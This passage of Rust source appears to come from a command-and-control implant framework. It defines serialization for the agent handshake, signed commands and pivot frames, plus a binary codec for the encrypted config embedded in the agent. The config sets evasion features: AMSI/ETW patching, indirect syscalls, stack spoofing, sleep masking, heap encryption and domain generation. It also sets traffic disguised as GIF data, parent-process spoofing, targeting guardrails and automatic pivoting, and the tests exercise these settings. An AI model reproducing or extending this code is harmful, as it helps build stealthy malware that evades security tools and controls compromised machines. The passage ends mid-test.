                    task_batch_size: s.next_element()?.unwrap_or_else(default_task_batch_size),
                    dga: s.next_element()?.unwrap_or_default(),
                    valid_parents: s.next_element()?.unwrap_or_default(),
                    sleep_mask: s.next_element()?.unwrap_or_else(default_sleep_mask),
                    indirect_syscalls: s.next_element()?.unwrap_or_else(default_true),
                    stack_spoof: s.next_element()?.unwrap_or_else(default_true),
                    patch_amsi_etw: s.next_element()?.unwrap_or_else(default_true),
                    heap_encrypt: s.next_element()?.unwrap_or_else(default_true),
                    guard_domain: s.next_element()?.unwrap_or_default(),
                    guard_hostname: s.next_element()?.unwrap_or_default(),
                    guard_hour_start: s.next_element()?.unwrap_or_default(),
                    guard_hour_end: s.next_element()?.unwrap_or_default(),
                    guard_no_system: s.next_element()?.unwrap_or_default(),
                    auto_pivot_port: s.next_element()?.unwrap_or_default(),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for ClientHello {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.hostname)?;
        seq.serialize_element(&self.os)?;
        seq.serialize_element(&self.computer_id)?;
        seq.serialize_element(&self.exe_id)?;
        seq.serialize_element(&self.build_id)?;
        seq.serialize_element(&self.auth_hmac)?;
        seq.serialize_element(&self.reg_timestamp)?;
        seq.serialize_element(&self.interfaces)?;
        seq.serialize_element(&self.hibernation_mode)?;
        seq.serialize_element(&self.task_batch_size)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for ClientHello {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = ClientHello;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(ClientHello {
                    hostname: s.next_element()?.ok_or_else(truncated)?,
                    os: s.next_element()?.ok_or_else(truncated)?,
                    computer_id: s.next_element()?.ok_or_else(truncated)?,
                    exe_id: s.next_element()?.ok_or_else(truncated)?,
                    build_id: s.next_element()?.ok_or_else(truncated)?,
                    auth_hmac: s.next_element()?.unwrap_or_default(),
                    reg_timestamp: s.next_element()?.unwrap_or_default(),
                    interfaces: s.next_element()?.unwrap_or_default(),
                    hibernation_mode: s.next_element()?.unwrap_or_default(),
                    task_batch_size: s.next_element()?.unwrap_or_else(default_task_batch_size),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for HandshakeChallenge {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.nonce)?;
        seq.serialize_element(&self.server_proof)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for HandshakeChallenge {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = HandshakeChallenge;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(HandshakeChallenge {
                    nonce: s.next_element()?.ok_or_else(truncated)?,
                    server_proof: s.next_element()?.ok_or_else(truncated)?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for HandshakeResponse {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.hmac)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for HandshakeResponse {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = HandshakeResponse;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(HandshakeResponse {
                    hmac: s.next_element()?.ok_or_else(truncated)?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for SecuredCommand {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.session_id)?;
        seq.serialize_element(&self.counter)?;
        seq.serialize_element(&self.nonce)?;
        // RFC3339 string keeps the wire form identical to chrono's serde
        // representation and matches get_signable_bytes canonicalization.
        seq.serialize_element(&self.timestamp.to_rfc3339())?;
        seq.serialize_element(&self.command)?;
        seq.serialize_element(&self.signature)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for SecuredCommand {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = SecuredCommand;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                let session_id = s.next_element()?.ok_or_else(truncated)?;
                let counter = s.next_element()?.ok_or_else(truncated)?;
                let nonce = s.next_element()?.ok_or_else(truncated)?;
                let ts: String = s.next_element()?.ok_or_else(truncated)?;
                let timestamp = DateTime::parse_from_rfc3339(&ts)
                    .map_err(de::Error::custom)?
                    .with_timezone(&Utc);
                let command = s.next_element()?.ok_or_else(truncated)?;
                let signature = s.next_element()?.ok_or_else(truncated)?;
                Ok(SecuredCommand { session_id, counter, nonce, timestamp, command, signature })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for CommandResponse {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.request_id)?;
        seq.serialize_element(&self.output)?;
        seq.serialize_element(&self.error)?;
        seq.serialize_element(&self.exit_code)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for CommandResponse {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = CommandResponse;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(CommandResponse {
                    request_id: s.next_element()?.ok_or_else(truncated)?,
                    output: s.next_element()?.ok_or_else(truncated)?,
                    error: s.next_element()?.ok_or_else(truncated)?,
                    exit_code: s.next_element()?.ok_or_else(truncated)?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for PivotFrame {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.stream_id)?;
        seq.serialize_element(&self.destination)?;
        seq.serialize_element(&self.source)?;
        seq.serialize_element(&self.data)?;
        seq.serialize_element(&self.metadata)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for PivotFrame {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = PivotFrame;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(PivotFrame {
                    stream_id: s.next_element()?.ok_or_else(truncated)?,
                    destination: s.next_element()?.ok_or_else(truncated)?,
                    source: s.next_element()?.ok_or_else(truncated)?,
                    data: s.next_element()?.ok_or_else(truncated)?,
                    metadata: s.next_element()?.unwrap_or_default(),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

// ── Packed binary embedded-config codec (no serde at rest) ──────────────────
//
// C2Config is embedded in the agent binary as an AES-256-GCM-encrypted blob
// produced by C2Config::pack() in the builder and consumed by
// C2Config::unpack() in the agent. Using a bespoke binary codec instead of
// JSON keeps even the encrypted-at-rest form free of serde machinery.
//
// Format: u8 version (0x01), then fields in struct declaration order.
//   String         -> u32 LE byte length + UTF-8 bytes
//   Vec<u8>        -> u32 LE byte length + raw bytes
//   Vec<T>         -> u32 LE element count + packed elements
//   bool / u8      -> 1 byte (bool strictly 0 or 1)
//   u16/u32/u64    -> LE bytes; usize is stored as u64; i64 as LE bytes
//   Option<T>      -> tag byte 0/1 (+ packed payload when 1)
// unpack is strict: any truncation, bad tag, or trailing byte => None.

const CONFIG_PACK_VERSION: u8 = 0x01;

fn pack_str(out: &mut Vec<u8>, s: &str) {
    out.extend_from_slice(&(s.len() as u32).to_le_bytes());
    out.extend_from_slice(s.as_bytes());
}

fn pack_bytes(out: &mut Vec<u8>, b: &[u8]) {
    out.extend_from_slice(&(b.len() as u32).to_le_bytes());
    out.extend_from_slice(b);
}

fn pack_str_vec(out: &mut Vec<u8>, v: &[String]) {
    out.extend_from_slice(&(v.len() as u32).to_le_bytes());
    for s in v { pack_str(out, s); }
}

fn take<'a>(cur: &mut &'a [u8], n: usize) -> Option<&'a [u8]> {
    if cur.len() < n { return None; }
    let (head, tail) = cur.split_at(n);
    *cur = tail;
    Some(head)
}

fn take_u8(cur: &mut &[u8]) -> Option<u8> {
    Some(take(cur, 1)?[0])
}

fn take_bool(cur: &mut &[u8]) -> Option<bool> {
    match take_u8(cur)? {
        0 => Some(false),
        1 => Some(true),
        _ => None,
    }
}

fn take_u16(cur: &mut &[u8]) -> Option<u16> {
    let b = take(cur, 2)?;
    Some(u16::from_le_bytes([b[0], b[1]]))
}

fn take_u32(cur: &mut &[u8]) -> Option<u32> {
    let b = take(cur, 4)?;
    Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

fn take_u64(cur: &mut &[u8]) -> Option<u64> {
    let b = take(cur, 8)?;
    Some(u64::from_le_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]))
}

fn take_i64(cur: &mut &[u8]) -> Option<i64> {
    let b = take(cur, 8)?;
    Some(i64::from_le_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]))
}

fn take_str(cur: &mut &[u8]) -> Option<String> {
    let len = take_u32(cur)? as usize;
    let b = take(cur, len)?;
    String::from_utf8(b.to_vec()).ok()
}

fn take_bytes(cur: &mut &[u8]) -> Option<Vec<u8>> {
    let len = take_u32(cur)? as usize;
    Some(take(cur, len)?.to_vec())
}

fn take_str_vec(cur: &mut &[u8]) -> Option<Vec<String>> {
    let n = take_u32(cur)? as usize;
    // Cap pre-allocation: a corrupt count must not trigger a huge alloc
    // before the first element parse fails.
    let mut v = Vec::with_capacity(n.min(4096));
    for _ in 0..n { v.push(take_str(cur)?); }
    Some(v)
}

impl TransportProtocol {
    fn pack_into(&self, out: &mut Vec<u8>) {
        out.push(match self {
            TransportProtocol::Tls => 0,
            TransportProtocol::TcpPlain => 1,
            TransportProtocol::NamedPipe => 2,
            TransportProtocol::Http => 3,
            TransportProtocol::Https => 4,
        });
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(match take_u8(cur)? {
            0 => TransportProtocol::Tls,
            1 => TransportProtocol::TcpPlain,
            2 => TransportProtocol::NamedPipe,
            3 => TransportProtocol::Http,
            4 => TransportProtocol::Https,
            _ => return None,
        })
    }
}

impl FallbackStrategy {
    fn pack_into(&self, out: &mut Vec<u8>) {
        out.push(match self {
            FallbackStrategy::RoundRobin => 0,
            FallbackStrategy::Random => 1,
            FallbackStrategy::Priority => 2,
            FallbackStrategy::Failover => 3,
        });
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(match take_u8(cur)? {
            0 => FallbackStrategy::RoundRobin,
            1 => FallbackStrategy::Random,
            2 => FallbackStrategy::Priority,
            3 => FallbackStrategy::Failover,
            _ => return None,
        })
    }
}

impl ProxyConfig {
    fn pack_into(&self, out: &mut Vec<u8>) {
        out.push(self.use_system as u8);
        pack_str(out, &self.url);
        pack_str(out, &self.username);
        pack_str(out, &self.password);
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(Self {
            use_system: take_bool(cur)?,
            url: take_str(cur)?,
            username: take_str(cur)?,
            password: take_str(cur)?,
        })
    }
}

impl TransformStep {
    fn pack_into(&self, out: &mut Vec<u8>) {
        match self {
            TransformStep::Base64 => out.push(0),
            TransformStep::Hex => out.push(1),
            TransformStep::Mask(key) => { out.push(2); pack_bytes(out, key); }
            TransformStep::Prepend(p) => { out.push(3); pack_str(out, p); }
            TransformStep::Append(p) => { out.push(4); pack_str(out, p); }
        }
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(match take_u8(cur)? {
            0 => TransformStep::Base64,
            1 => TransformStep::Hex,
            2 => TransformStep::Mask(take_bytes(cur)?),
            3 => TransformStep::Prepend(take_str(cur)?),
            4 => TransformStep::Append(take_str(cur)?),
            _ => return None,
        })
    }
}

impl HttpBlock {
    fn pack_into(&self, out: &mut Vec<u8>) {
        pack_str_vec(out, &self.uris);
        out.extend_from_slice(&(self.headers.len() as u32).to_le_bytes());
        for (k, v) in &self.headers {
            pack_str(out, k);
            pack_str(out, v);
        }
        out.extend_from_slice(&(self.data_transform.len() as u32).to_le_bytes());
        for step in &self.data_transform {
            step.pack_into(out);
        }
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        let uris = take_str_vec(cur)?;
        let hn = take_u32(cur)? as usize;
        let mut headers = HashMap::with_capacity(hn.min(4096));
        for _ in 0..hn {
            let k = take_str(cur)?;
            let v = take_str(cur)?;
            headers.insert(k, v);
        }
        let dn = take_u32(cur)? as usize;
        let mut data_transform = Vec::with_capacity(dn.min(4096));
        for _ in 0..dn {
            data_transform.push(TransformStep::take_from(cur)?);
        }
        Some(Self { uris, headers, data_transform })
    }
}

impl MalleableProfile {
    fn pack_into(&self, out: &mut Vec<u8>) {
        pack_str(out, &self.name);
        pack_str(out, &self.user_agent);
        self.http_get.pack_into(out);
        self.http_post.pack_into(out);
        out.push(self.format_http as u8);
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(Self {
            name: take_str(cur)?,
            user_agent: take_str(cur)?,
            http_get: HttpBlock::take_from(cur)?,
            http_post: HttpBlock::take_from(cur)?,
            format_http: take_bool(cur)?,
        })
    }
}

impl FallbackEndpoint {
    fn pack_into(&self, out: &mut Vec<u8>) {
        pack_str(out, &self.host);
        out.extend_from_slice(&self.port.to_le_bytes());
        self.transport.pack_into(out);
        match &self.profile {
            None => out.push(0),
            Some(p) => { out.push(1); p.pack_into(out); }
        }
        match &self.proxy {
            None => out.push(0),
            Some(p) => { out.push(1); p.pack_into(out); }
        }
        out.extend_from_slice(&self.priority.to_le_bytes());
        out.extend_from_slice(&self.weight.to_le_bytes());
        out.extend_from_slice(&self.max_failures.to_le_bytes());
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(Self {
            host: take_str(cur)?,
            port: take_u16(cur)?,
            transport: TransportProtocol::take_from(cur)?,
            profile: match take_u8(cur)? {
                0 => None,
                1 => Some(MalleableProfile::take_from(cur)?),
                _ => return None,
            },
            proxy: match take_u8(cur)? {
                0 => None,
                1 => Some(ProxyConfig::take_from(cur)?),
                _ => return None,
            },
            priority: take_u32(cur)?,
            weight: take_u32(cur)?,
            max_failures: take_u32(cur)?,
        })
    }
}

impl FallbackConfig {
    fn pack_into(&self, out: &mut Vec<u8>) {
        out.extend_from_slice(&(self.endpoints.len() as u32).to_le_bytes());
        for ep in &self.endpoints {
            ep.pack_into(out);
        }
        self.strategy.pack_into(out);
        out.extend_from_slice(&self.dead_time_secs.to_le_bytes());
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        let n = take_u32(cur)? as usize;
        let mut endpoints = Vec::with_capacity(n.min(4096));
        for _ in 0..n {
            endpoints.push(FallbackEndpoint::take_from(cur)?);
        }
        Some(Self {
            endpoints,
            strategy: FallbackStrategy::take_from(cur)?,
            dead_time_secs: take_u64(cur)?,
        })
    }
}

impl DgaConfig {
    fn pack_into(&self, out: &mut Vec<u8>) {
        out.extend_from_slice(&self.seed.to_le_bytes());
        out.extend_from_slice(&self.window_secs.to_le_bytes());
        out.extend_from_slice(&self.count.to_le_bytes());
        pack_str_vec(out, &self.tlds);
        out.extend_from_slice(&self.max_failures_per_domain.to_le_bytes());
    }

    fn take_from(cur: &mut &[u8]) -> Option<Self> {
        Some(Self {
            seed: take_u64(cur)?,
            window_secs: take_u64(cur)?,
            count: take_u32(cur)?,
            tlds: take_str_vec(cur)?,
            max_failures_per_domain: take_u32(cur)?,
        })
    }
}

impl C2Config {
    /// Pack the config into the versioned binary blob embedded in the agent.
    pub fn pack(&self) -> Vec<u8> {
        let mut out = Vec::with_capacity(256);
        out.push(CONFIG_PACK_VERSION);
        self.transport.pack_into(&mut out);
        self.profile.pack_into(&mut out);
        self.proxy.pack_into(&mut out);
        self.fallback.pack_into(&mut out);
        pack_str(&mut out, &self.server_public_key);
        pack_str(&mut out, &self.hash_salt);
        pack_str(&mut out, &self.c2_host);
        pack_str(&mut out, &self.build_id);
        out.extend_from_slice(&self.tunnel_port.to_le_bytes());
        out.extend_from_slice(&self.sleep_interval.to_le_bytes());
        out.extend_from_slice(&self.jitter_min.to_le_bytes());
        out.extend_from_slice(&self.jitter_max.to_le_bytes());
        out.extend_from_slice(&self.bloat_mb.to_le_bytes());
        out.push(self.debug as u8);
        match self.kill_date {
            None => out.push(0),
            Some(t) => { out.push(1); out.extend_from_slice(&t.to_le_bytes()); }
        }
        pack_str(&mut out, &self.challenge_key);
        match &self.sni_override {
            None => out.push(0),
            Some(s) => { out.push(1); pack_str(&mut out, s); }
        }
        pack_str_vec(&mut out, &self.alpn_protocols);
        out.push(self.hibernation_mode as u8);
        out.extend_from_slice(&(self.task_batch_size as u64).to_le_bytes());
        match &self.dga {
            None => out.push(0),
            Some(d) => { out.push(1); d.pack_into(&mut out); }
        }
        pack_str_vec(&mut out, &self.valid_parents);
        pack_str(&mut out, &self.sleep_mask);
        out.push(self.indirect_syscalls as u8);
        out.push(self.stack_spoof as u8);
        out.push(self.patch_amsi_etw as u8);
        out.push(self.heap_encrypt as u8);
        pack_str(&mut out, &self.guard_domain);
        pack_str(&mut out, &self.guard_hostname);
        out.push(self.guard_hour_start);
        out.push(self.guard_hour_end);
        out.push(self.guard_no_system as u8);
        match self.auto_pivot_port {
            None => out.push(0),
            Some(p) => { out.push(1); out.extend_from_slice(&p.to_le_bytes()); }
        }
        out
    }

    /// Unpack a blob produced by pack(). Strict: wrong version, truncation,
    /// bad tags, or trailing bytes all yield None.
    pub fn unpack(buf: &[u8]) -> Option<C2Config> {
        let mut cur = buf;
        if take_u8(&mut cur)? != CONFIG_PACK_VERSION { return None; }
        let cfg = C2Config {
            transport: TransportProtocol::take_from(&mut cur)?,
            profile: MalleableProfile::take_from(&mut cur)?,
            proxy: ProxyConfig::take_from(&mut cur)?,
            fallback: FallbackConfig::take_from(&mut cur)?,
            server_public_key: take_str(&mut cur)?,
            hash_salt: take_str(&mut cur)?,
            c2_host: take_str(&mut cur)?,
            build_id: take_str(&mut cur)?,
            tunnel_port: take_u16(&mut cur)?,
            sleep_interval: take_u64(&mut cur)?,
            jitter_min: take_u32(&mut cur)?,
            jitter_max: take_u32(&mut cur)?,
            bloat_mb: take_u64(&mut cur)?,
            debug: take_bool(&mut cur)?,
            kill_date: match take_u8(&mut cur)? {
                0 => None,
                1 => Some(take_i64(&mut cur)?),
                _ => return None,
            },
            challenge_key: take_str(&mut cur)?,
            sni_override: match take_u8(&mut cur)? {
                0 => None,
                1 => Some(take_str(&mut cur)?),
                _ => return None,
            },
            alpn_protocols: take_str_vec(&mut cur)?,
            hibernation_mode: take_bool(&mut cur)?,
            task_batch_size: take_u64(&mut cur)? as usize,
            dga: match take_u8(&mut cur)? {
                0 => None,
                1 => Some(DgaConfig::take_from(&mut cur)?),
                _ => return None,
            },
            valid_parents: take_str_vec(&mut cur)?,
            sleep_mask: take_str(&mut cur)?,
            indirect_syscalls: take_bool(&mut cur)?,
            stack_spoof: take_bool(&mut cur)?,
            patch_amsi_etw: take_bool(&mut cur)?,
            heap_encrypt: take_bool(&mut cur)?,
            guard_domain: take_str(&mut cur)?,
            guard_hostname: take_str(&mut cur)?,
            guard_hour_start: take_u8(&mut cur)?,
            guard_hour_end: take_u8(&mut cur)?,
            guard_no_system: take_bool(&mut cur)?,
            auto_pivot_port: match take_u8(&mut cur)? {
                0 => None,
                1 => Some(take_u16(&mut cur)?),
                _ => return None,
            },
        };
        if !cur.is_empty() { return None; } // strict: reject trailing bytes
        Some(cfg)
    }
}

/// Hard maximum frame size for length-prefixed transport (10 MB).
/// A malformed length prefix above this causes immediate rejection.
/// No typed-config field covers the wire frame cap - intentionally fixed.
pub fn max_frame_size() -> usize { crate::config::config().transfer.max_frame_bytes as usize }

/// Soft warning threshold. Frames above this are logged but accepted.
/// No typed-config field covers the warn threshold - intentionally fixed.
pub fn frame_warn_size() -> usize { crate::config::config().transfer.frame_warn_bytes as usize }

pub struct Session {
    pub id: u32,
    pub computer_id: String,
    pub addr: SocketAddr,
    pub hostname: String,
    pub os: String,
    pub tx: mpsc::UnboundedSender<(String, Option<oneshot::Sender<u64>>)>,
    pub signing_key: SigningKey,
    pub parent_id: Option<u32>,
    pub last_seen: Arc<std::sync::atomic::AtomicI64>,
    /// Network interfaces as reported at registration.
    pub interfaces: Vec<NetworkInterface>,
    /// Whether this session is a hibernating agent.
    pub hibernation_mode: bool,
}

impl Session {
    pub fn touch(&self) {
        let now = chrono::Utc::now().timestamp();
        self.last_seen.store(now, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn seconds_since_seen(&self) -> i64 {
        let now = chrono::Utc::now().timestamp();
        let last = self.last_seen.load(std::sync::atomic::Ordering::Relaxed);
        now - last
    }
}

pub type SharedSessions = Arc<DashMap<u32, Session>>;

#[cfg(test)]
mod tests {
    use super::*;

    fn full_config() -> C2Config {
        let mut headers = HashMap::new();
        headers.insert("Content-Type".to_string(), "application/octet-stream".to_string());
        C2Config {
            transport: TransportProtocol::Https,
            profile: MalleableProfile {
                name: "p1".into(),
                user_agent: "UA/1.0".into(),
                http_get: HttpBlock {
                    uris: vec!["/a".into(), "/b".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Base64, TransformStep::Append("GIF89a".into())],
                },
                http_post: HttpBlock {
                    uris: vec!["/c".into()],
                    headers,
                    data_transform: vec![TransformStep::Mask(vec![1, 2, 3]), TransformStep::Prepend("x".into())],
                },
                format_http: true,
            },
            proxy: ProxyConfig {
                use_system: false,
                url: "http://proxy:8080".into(),
                username: "u".into(),
                password: "p".into(),
            },
            fallback: FallbackConfig {
                endpoints: vec![
                    FallbackEndpoint {
                        host: "a.com".into(), port: 443,
                        transport: TransportProtocol::Https,
                        profile: None, proxy: None,
                        priority: 0, weight: 1, max_failures: 3,
                    },
                    FallbackEndpoint {
                        host: "b.com".into(), port: 8443,
                        transport: TransportProtocol::Tls,
                        profile: Some(MalleableProfile::default()),
                        proxy: Some(ProxyConfig::default()),
                        priority: 5, weight: 9, max_failures: 7,
                    },
                ],
                strategy: FallbackStrategy::RoundRobin,
                dead_time_secs: 120,
            },
            server_public_key: "pk".into(),
            hash_salt: "salt".into(),
            c2_host: "10.0.0.1".into(),
            build_id: "bld".into(),
            tunnel_port: 4443,
            sleep_interval: 30,
            jitter_min: 10,
            jitter_max: 20,
            bloat_mb: 7,
            debug: true,
            kill_date: Some(1_900_000_000),
            challenge_key: "ck".into(),
            sni_override: Some("cdn.example.com".into()),
            alpn_protocols: vec!["http/1.1".into()],
            hibernation_mode: true,
            task_batch_size: 4,
            dga: Some(DgaConfig {
                seed: 42, window_secs: 3600, count: 8,
                tlds: vec!["io".into()], max_failures_per_domain: 2,
            }),
            valid_parents: vec!["explorer.exe".into()],
            sleep_mask: "foliage".into(),
            indirect_syscalls: false,
            stack_spoof: true,
            patch_amsi_etw: false,
            heap_encrypt: true,
            guard_domain: "CORP*".into(),
            guard_hostname: "WKS??".into(),
            guard_hour_start: 8,
            guard_hour_end: 18,
            guard_no_system: true,
            auto_pivot_port: Some(5002),
        }
    }

    #[test]
    fn test_secured_command_signable_bytes_deterministic() {
        let cmd = SecuredCommand {
            session_id: "sess1".to_string(),
            counter: 42,
            nonce: 12345,
            timestamp: chrono::DateTime::parse_from_rfc3339("2024-01-15T10:30:00+00:00").unwrap().with_timezone(&chrono::Utc),
            command: "whoami".to_string(),
            signature: String::new(),
        };
        let bytes1 = cmd.get_signable_bytes();
        let bytes2 = cmd.get_signable_bytes();
        assert_eq!(bytes1, bytes2);
        assert!(!bytes1.is_empty());
    }

    #[test]
    fn test_secured_command_different_commands_different_bytes() {
        let base = SecuredCommand {
            session_id: "s".to_string(), counter: 1, nonce: 1,
            timestamp: chrono::Utc::now(), command: "cmd1".to_string(), signature: String::new(),
        };
        let other = SecuredCommand {
            session_id: "s".to_string(), counter: 1, nonce: 1,
            timestamp: base.timestamp, command: "cmd2".to_string(), signature: String::new(),
        };
        assert_ne!(base.get_signable_bytes(), other.get_signable_bytes());
    }

    #[test]
    fn test_transport_protocol_serialization() {
        // u8 variant tags: Tls=0 .. Https=4
        assert_eq!(serde_json::to_string(&TransportProtocol::Tls).unwrap(), "0");
        assert_eq!(serde_json::to_string(&TransportProtocol::Https).unwrap(), "4");
        let rt: TransportProtocol = serde_json::from_str("3").unwrap();
        assert_eq!(rt, TransportProtocol::Http);
        assert!(serde_json::from_str::<TransportProtocol>("9").is_err());
    }

    #[test]
    fn test_fallback_strategy_serialization() {
        assert_eq!(serde_json::to_string(&FallbackStrategy::RoundRobin).unwrap(), "0");
        let rt: FallbackStrategy = serde_json::from_str("3").unwrap();
        assert_eq!(rt, FallbackStrategy::Failover);
    }

    #[test]
    fn test_transform_step_serialization() {
        assert_eq!(serde_json::to_string(&TransformStep::Base64).unwrap(), "[0]");
        assert_eq!(
            serde_json::to_string(&TransformStep::Prepend("GIF89a".into())).unwrap(),
            "[3,\"GIF89a\"]"
        );
        let rt: TransformStep = serde_json::from_str("[2,[1,2,3]]").unwrap();
        match rt {
            TransformStep::Mask(k) => assert_eq!(k, vec![1u8, 2, 3]),
            _ => panic!("wrong variant"),
        }
    }

    /// Minimal positional array: required fields only; everything else must
    /// fall back to the old serde defaults.
    const MINIMAL_CONFIG_JSON: &str = r#"[
        0,
        ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
        [],
        [],
        "abc","xyz","10.0.0.1","test",4443,30,10,20
    ]"#;

    #[test]
    fn test_c2config_deserialize_minimal() {
        let config: C2Config = serde_json::from_str(MINIMAL_CONFIG_JSON).unwrap();
        assert_eq!(config.c2_host, "10.0.0.1");
        assert_eq!(config.tunnel_port, 4443);
        assert!(config.fallback.endpoints.is_empty());
        assert_eq!(config.fallback.strategy, FallbackStrategy::Priority);
        // Present-but-empty fallback seq: element defaults apply
        // (dead_time_secs = 300), matching the old `"fallback": {}` behavior.
        assert_eq!(config.fallback.dead_time_secs, 300);
        assert!(config.proxy.use_system);
        // Evasion defaults: all on, sleep_mask = ekko
        assert_eq!(config.sleep_mask, "ekko");
        assert!(config.indirect_syscalls);
        assert!(config.stack_spoof);
        assert!(config.patch_amsi_etw);
        assert!(config.heap_encrypt);
        // Guardrail defaults: all permissive
        assert!(config.guard_domain.is_empty());
        assert!(config.guard_hostname.is_empty());
        assert_eq!(config.guard_hour_start, 0);
        assert_eq!(config.guard_hour_end, 0);
        assert!(!config.guard_no_system);
        // Pivot auto-cascade: disabled by default
        assert!(config.auto_pivot_port.is_none());
        assert_eq!(config.task_batch_size, 10);
        assert!(config.dga.is_none());
    }

    #[test]
    fn test_c2config_deserialize_truncated_fallback_defaults() {
        // Fallback seq with one truncated endpoint: endpoint-level defaults
        // (transport=tls, priority=0, weight=1, max_failures=5) and
        // fallback-level defaults (strategy=priority, dead_time_secs=300).
        let json = r#"[
            0,
            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [[["a.com",8443]]],
            "abc","xyz","h","b",443,5,0,0
        ]"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.fallback.endpoints.len(), 1);
        let ep = &config.fallback.endpoints[0];
        assert_eq!(ep.host, "a.com");
        assert_eq!(ep.port, 8443);
        assert_eq!(ep.transport, TransportProtocol::Tls);
        assert!(ep.profile.is_none());
        assert!(ep.proxy.is_none());
        assert_eq!(ep.priority, 0);
        assert_eq!(ep.weight, 1);
        assert_eq!(ep.max_failures, 5);
        assert_eq!(config.fallback.strategy, FallbackStrategy::Priority);
        assert_eq!(config.fallback.dead_time_secs, 300);
    }

    #[test]
    fn test_c2config_deserialize_with_fallback() {
        let json = r#"[
            4,
            ["default","Mozilla/5.0",[["/default"],{},[]],[["/default"],{},[]],false],
            [],
            [
                [["a.com",443,4],["b.com",8443,0,null,null,5]],
                0,
                120
            ],
            "","","primary.com","b1",443,5,0,0
        ]"#;
        let config: C2Config = serde_json::from_str(json).unwrap();
        assert_eq!(config.fallback.endpoints.len(), 2);
        assert_eq!(config.fallback.strategy, FallbackStrategy::RoundRobin);
        assert_eq!(config.fallback.dead_time_secs, 120);
        assert_eq!(config.fallback.endpoints[1].priority, 5);
        // Endpoint-level defaults: weight=1, max_failures=5
        assert_eq!(config.fallback.endpoints[0].weight, 1);
        assert_eq!(config.fallback.endpoints[0].max_failures, 5);
    }

    #[test]
    fn test_c2config_deserialize_evasion_and_guardrails() {
        let json = r#"[
            0,
